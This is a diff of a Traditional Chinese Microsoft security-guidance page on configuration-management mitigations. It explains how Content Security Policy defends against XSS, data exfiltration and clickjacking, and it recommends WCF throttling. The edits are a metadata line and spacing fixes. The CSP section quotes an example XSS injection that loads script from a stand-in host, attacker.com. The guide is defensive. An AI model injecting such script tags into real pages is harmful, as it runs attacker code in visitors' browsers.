@@ -19,6 +19,7 @@ ms.sourcegitcommit: 9890483687a2b28860ec179f5fd0a292cdf11d22
 ms.translationtype: HT
 ms.contentlocale: zh-TW
 ms.lasthandoff: 01/24/2018
+ms.locfileid: "28019818"
 ---
 # <a name="security-frame-configuration-management--mitigations"></a>安全框架︰組態管理 | 緩和措施 
 | 產品/服務 | 文章 |
@@ -42,7 +43,7 @@ ms.lasthandoff: 01/24/2018
 | **適用的技術** | 泛型 |
 | **屬性**              | N/A  |
 | **參考**              | [內容安全性原則簡介](http://www.html5rocks.com/en/tutorials/security/content-security-policy/)、[內容安全性原則參考](http://content-security-policy.com/)、[安全性功能](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/)、[內容安全性原則簡介](https://docs.webplatform.org/wiki/tutorials/content-security-policy)、[我可以使用 CSP 嗎？](http://caniuse.com/#feat=contentsecuritypolicy) |
-| **步驟** | <p>內容安全性原則 (CSP) 是深度防禦安全性機制、W3C 標準，可讓 Web 應用程式擁有者能控制其網站中內嵌的內容。 CSP 會新增為 Web 伺服器上的 HTTP 回應標頭，並由瀏覽器在用戶端上強制執行。 這是以允許清單為基礎的原則 - 網站可以宣告一組可從中載入主動式內容 (例如 JavaScript) 的受信任網域。</p><p>CSP 具有以下安全性優勢：</p><ul><li>**防禦 XSS︰**如果頁面遭受 XSS 威脅，攻擊者入侵它的方式有 2 種︰<ul><li>插入 `<script>malicious code</script>`。 此入侵將因為 CSP 的基礎限制 1 而無法運作</li><li>插入 `<script src=”http://attacker.com/maliciousCode.js”/>`。 此入侵無法運作，因為攻擊者所控制的網域不在網域的 CSP 允許清單中</li></ul></li><li>**控制資料外洩︰**如果網頁上的任何惡意內容嘗試連線至外部網站並竊取資料，CSP 將會中止連線。 這是因為目標網域不在 CSP 的允許清單中</li><li>**防禦點擊劫持：**點擊劫持 (Clickjacking) 是一種攻擊技巧，敵人可用來建構真正的網站並強制使用者點按 UI 項目。 目前可藉由設定回應標頭- X-Frame-Options 來防禦點擊劫持。 並非所有瀏覽器都遵守此標頭，而轉寄 CSP 會是防禦點擊劫持的標準方法</li><li>**即時攻擊報告︰**如果已啟用 CSP 的網站上有資料隱碼攻擊，則瀏覽器會自動對 Web 伺服器上設定的端點觸發通知。 如此一來，CSP 可當作即時警告系統。</li></ul> |
+| **步驟** | <p>內容安全性原則 (CSP) 是深度防禦安全性機制、W3C 標準，可讓 Web 應用程式擁有者能控制其網站中內嵌的內容。 CSP 會新增為 Web 伺服器上的 HTTP 回應標頭，並由瀏覽器在用戶端上強制執行。 這是以允許清單為基礎的原則 - 網站可以宣告一組可從中載入主動式內容 (例如 JavaScript) 的受信任網域。</p><p>CSP 具有以下安全性優勢：</p><ul><li>**防禦 XSS︰** 如果頁面遭受 XSS 威脅，攻擊者入侵它的方式有 2 種︰<ul><li>插入 `<script>malicious code</script>`。 此入侵將因為 CSP 的基礎限制 1 而無法運作</li><li>插入 `<script src=”http://attacker.com/maliciousCode.js”/>`。 此入侵無法運作，因為攻擊者所控制的網域不在網域的 CSP 允許清單中</li></ul></li><li>**控制資料外洩︰** 如果網頁上的任何惡意內容嘗試連線至外部網站並竊取資料，CSP 將會中止連線。 這是因為目標網域不在 CSP 的允許清單中</li><li>**防禦點擊劫持：** 點擊劫持 (Clickjacking) 是一種攻擊技巧，敵人可用來建構真正的網站並強制使用者點按 UI 項目。 目前可藉由設定回應標頭- X-Frame-Options 來防禦點擊劫持。 並非所有瀏覽器都遵守此標頭，而轉寄 CSP 會是防禦點擊劫持的標準方法</li><li>**即時攻擊報告︰** 如果已啟用 CSP 的網站上有資料隱碼攻擊，則瀏覽器會自動對 Web 伺服器上設定的端點觸發通知。 如此一來，CSP 可當作即時警告系統。</li></ul> |
 
 ### <a name="example"></a>範例
 範例原則︰ 
@@ -606,7 +607,7 @@ public void ConfigureServices(IServiceCollection services)
 | **適用的技術** | .NET Framework 3 |
 | **屬性**              | N/A  |
 | **參考**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx)、[Fortify Kingdom](https://vulncat.fortify.com/en/vulncat/index.html) |
-| **步驟** | <p>未設定系統資源的使用限制，可能會導致資源耗盡，而最後導致拒絕服務。</p><ul><li>**說明︰**Windows Communication Foundation (WCF) 提供服務要求節流的功能。 允許太多的用戶端要求可能會淹沒系統及耗盡其資源。 另一方面，只允許服務有少數要求可防止合法使用者使用此服務。 每項服務應個別調整並設定為允許適當的資源數量。</li><li>**建議** 啟用 WCF 的服務節流功能以及為應用程式設定適當的限制。</li></ul>|
+| **步驟** | <p>未設定系統資源的使用限制，可能會導致資源耗盡，而最後導致拒絕服務。</p><ul><li>**說明︰** Windows Communication Foundation (WCF) 提供服務要求節流的功能。 允許太多的用戶端要求可能會淹沒系統及耗盡其資源。 另一方面，只允許服務有少數要求可防止合法使用者使用此服務。 每項服務應個別調整並設定為允許適當的資源數量。</li><li>**建議** 啟用 WCF 的服務節流功能以及為應用程式設定適當的限制。</li></ul>|
 
 ### <a name="example"></a>範例
 下列是已啟用節流的範例組態︰
